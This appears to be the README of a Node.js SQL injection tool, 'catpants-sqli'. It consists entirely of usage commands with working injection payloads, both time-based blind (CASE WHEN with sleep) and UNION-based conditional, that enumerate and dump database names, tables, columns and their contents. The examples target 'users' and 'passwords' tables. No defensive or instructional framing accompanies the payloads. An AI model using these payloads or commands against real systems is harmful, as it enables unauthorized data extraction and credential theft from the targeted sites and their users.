# catpants-sqli
## Usage
### Blind
* `node . dump-db-names -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -"`
* `node . dump-table-names -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -" --db data`
* `node . dump-column-names -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -" --db data --table users`
* `node . dump-table-column -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -" --db data --table users --column id`
### Conditional
* `node . dump-db-names -u "http://192.168.0.1" -d "check=1' UNION ALL SELECT (CASE WHEN {{> query}} THEN 1 ELSE NULL END),NULL-- -" --condition found`
* `node . dump-table-names -u "http://192.168.0.1" -d "check=1' UNION ALL SELECT (CASE WHEN {{> query}} THEN 1 ELSE NULL END),NULL-- -" --condition found --db data`
* `node . dump-column-names -u "http://192.168.0.1" -d "check=1' UNION ALL SELECT (CASE WHEN {{> query}} THEN 1 ELSE NULL END),NULL-- -" --condition found --db data --table users`
* `node . dump-table-column -u "http://192.168.0.1" -d "check=1' UNION ALL SELECT (CASE WHEN {{> query}} THEN 1 ELSE NULL END),NULL-- -" --condition found --db data --table passwords --column catpants`
